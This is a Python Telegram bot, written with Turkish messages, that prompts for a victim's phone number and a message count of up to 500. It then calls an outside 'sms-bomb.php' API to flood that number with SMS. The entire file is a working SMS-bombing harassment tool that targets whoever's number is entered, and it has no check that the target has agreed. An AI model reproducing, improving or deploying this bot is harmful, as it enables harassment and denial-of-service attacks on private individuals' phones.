import os
import logging
import httpx
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# AYARLAR
TOKEN = os.getenv("BOT_TOKEN")
API_URL = "https://cvron.alwaysdata.net/cvronapi/sms-bomb.php"

if not TOKEN:
    raise Exception("BOT_TOKEN eklenmemiş!")

# LOG
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

PHONE, COUNT, CONFIRM = range(3)

# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text(
        "SMS gönderme botuna hoşgeldin.\n\n"
        "Başlatmak için /sms yaz."
    )


# /sms başlat
async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):

    context.user_data.clear()

    await update.message.reply_text(
        "Telefon numarası gir:\n"
        "Örnek: 5xxxxxxxxx"
    )

    return PHONE


# telefon al
async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):

    phone = update.message.text.strip()

    if not phone.isdigit():

        await update.message.reply_text(
            "Geçersiz numara, tekrar gir:"
        )
        return PHONE

    context.user_data["phone"] = phone

    await update.message.reply_text(
        "SMS adedi gir (örn: 10):"
    )

    return COUNT


# adet al
async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):

    try:

        count = int(update.message.text)

        if count <= 0 or count > 500:

            await update.message.reply_text(
                "1 ile 500 arası gir."
            )
            return COUNT

        context.user_data["count"] = count

        keyboard = [
            [InlineKeyboardButton("Onayla", callback_data="confirm")],
            [InlineKeyboardButton("İptal", callback_data="cancel")]
        ]

        await update.message.reply_text(
            f"Telefon: {context.user_data['phone']}\n"
            f"Adet: {count}\n\n"
            f"Onaylıyor musun?",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

        return CONFIRM

    except:

        await update.message.reply_text(
            "Geçersiz sayı, tekrar gir:"
        )

        return COUNT


# SMS gönder
async def send_sms(phone, count):

    url = f"{API_URL}?phone={phone}&count={count}"

    async with httpx.AsyncClient(timeout=60) as client:

        response = await client.get(url)

        return response.status_code == 200


# onay işlemi
async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query

    await query.answer()

    if query.data == "cancel":

        await query.edit_message_text("İptal edildi.")

        return ConversationHandler.END

    phone = context.user_data.get("phone")
    count = context.user_data.get("count")

    await query.edit_message_text("Gönderiliyor...")

    try:

        success = await send_sms(phone, count)

        if success:

            await query.edit_message_text(
                "SMS gönderimi başlatıldı."
            )

        else:

            await query.edit_message_text(
                "API hata verdi."
            )

    except Exception as e:

        await query.edit_message_text(
            f"Hata oluştu: {str(e)}"
        )

    return ConversationHandler.END


# iptal komutu
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text("İptal edildi.")

    return ConversationHandler.END


# ANA FONKSİYON
def main():

    app = Application.builder().token(TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("sms", sms)],
        states={

            PHONE: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    get_phone
                )
            ],

            COUNT: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    get_count
                )
            ],

            CONFIRM: [
                CallbackQueryHandler(confirm)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))

    app.add_handler(conv)

    print("Bot aktif ve stabil")

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
